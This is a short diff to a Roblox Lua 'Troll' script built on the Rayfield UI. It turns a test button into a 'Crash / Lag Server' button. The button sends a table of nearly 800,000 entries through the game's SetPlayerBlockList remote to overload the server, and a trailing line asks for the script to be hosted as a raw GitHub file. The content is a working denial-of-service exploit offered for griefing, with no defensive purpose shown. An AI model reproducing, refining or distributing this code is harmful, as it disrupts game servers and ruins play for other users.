@@ -14,8 +14,18 @@ local Window = Rayfield:CreateWindow({
 local Tab = Window:CreateTab("Troll", 4483362458)
 
 Tab:CreateButton({
-    Name = "Test Button",
+    Name = "Crash / Lag Server",
     Callback = function()
-        print("Timmy Tuff Script button activated!")
+    local remote = game:FindFirstChild("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
+local entries = 799999
+local payload = table.create(entries)
+
+for i = 1, entries do
+    payload[i] = { id = i, v = i * 2 }
+end
+
+remote:FireServer(payload)
+        print("Button activated!")
     end
 })
+ make this a raw github script
